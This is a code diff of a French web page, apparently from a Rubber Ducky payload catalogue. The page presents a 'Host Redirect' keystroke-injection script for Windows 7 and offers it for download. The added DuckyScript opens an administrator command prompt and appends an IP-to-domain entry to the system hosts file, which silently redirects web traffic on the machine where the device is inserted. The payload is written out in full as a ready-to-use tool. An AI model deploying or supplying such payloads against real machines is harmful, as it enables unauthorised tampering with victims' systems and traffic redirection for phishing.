@@ -96,33 +96,58 @@
 
   <!--Main layout-->
   <main class="mt-5 pt-5">
-  </br>
     <div class="container">
-      <h1 class="h1 ducky-blue-text">Rediriger les sites webs vers un host</h1>
-      </br>
-      <div class="row">
-        <div class="col-sm">
-          <h3 class="h3 ducky-blue-text">Informations </h3>
-          </br>
-          <div>
-            <h4 class="h4 ducky-blue-text">Système(s) d'exploitation </h4>
-            <p class="ducky-blue-text">Windows 7</p>
-          </div>
-          <div>
-          <h4 class="h4 ducky-blue-text">Fonctionnalité </h4>
-            <p class="ducky-blue-text">Avec ce script, tu pourras rediriger les liens vers un hôte, par exemple un portail d'entreprise. </br>Ce script altère le driver d'hosting afin d'injecter le lien souhaité.</p>
-          </div>
-          <div>
-            <h4 class="h4 ducky-blue-text">Déroulement du script</h4>
-            <p class="ducky-blue-text">Etape 1</p>
-            <p class="ducky-blue-text">Etape 2</p>
-            <p class="ducky-blue-text">Etape 3</p>
-          </div>
+      
+      <h3 class="ducky-blue-text pb-4">Host Redirect</h3>
+
+      <div>
+        <div class="py-4">
+          <h4 class="ducky-blue-text">Système(s) d'exploitation :</h4>
+          <p class="ducky-blue-text"><i class="fab fa-windows"></i> Windows 7</p>
         </div>
-        <div class="col-sm">
+
+        <div class="py-4">
+          <h4 class="ducky-blue-text">Fonctionnalités :</h4>
+          <p class="ducky-blue-text">Redirige les liens vers un hôte, par exemple un portail d'entreprise.</p>
+        </div>
+
+        <div class="py-4">
+          <h4 class="ducky-blue-text">Déroulement du script :</h4>
+
+          <ol>
+            <li class="ducky-blue-text">Ouverture de l'invité de commande</li>
+            <li class="ducky-blue-text">Ouverture des fichiers système</li>
+            <li class="ducky-blue-text">Ecriture du fichier de redirection</li>
+          </ol>
+        </div>
+
+        <div class="text-center py-4">
           <a href="../resources/scripts/dh-host-redirect.txt" download>
             <button type="button" class="btn btn-primary ducky-blue rounded">Télécharger</button>
           </a>
+        </div>
+
+        <div class="py-4">
+          <h4 class="ducky-blue-text">Le script :</h4>
+
+          <pre class="line-numbers mdb-color darken-3"><code>
+            <span class="new-line white-text"><span class="orange-text">DELAY</span> 3000</span>
+            <span class="new-line blue-text">ESC</span>
+            <span class="new-line blue-text">CTRL ESC</span>
+            <span class="new-line white-text"><span class="orange-text">DELAY</span> 400</span>
+            <span class="new-line white-text"><span class="cyan-text">STRING</span> cmd</span>
+            <span class="new-line white-text"><span class="orange-text">DELAY</span> 400</span>
+            <span class="new-line blue-text">CTRL SHIFT ENTER</span>
+            <span class="new-line white-text"><span class="orange-text">DELAY</span> 400</span>
+            <span class="new-line white-text"><span class="cyan-text">STRING</span> cd C:\Windows\System32\drivers\etc\</span>
+            <span class="new-line blue-text">ENTER</span>
+            <span class="new-line white-text"><span class="orange-text">DELAY</span> 400</span>
+            <span class="new-line white-text"><span class="cyan-text">STRING</span> echo 64.149.122.94 www.test.com>>hosts</span>
+            <span class="new-line blue-text">ENTER</span>
+            <span class="new-line white-text"><span class="orange-text">DELAY</span> 400</span>
+            <span class="new-line blue-text">ALT SPACE</span>
+            <span class="new-line white-text"><span class="cyan-text">STRING</span> c</span>
+          </code></pre>
         </div>
       </div>
     </div>
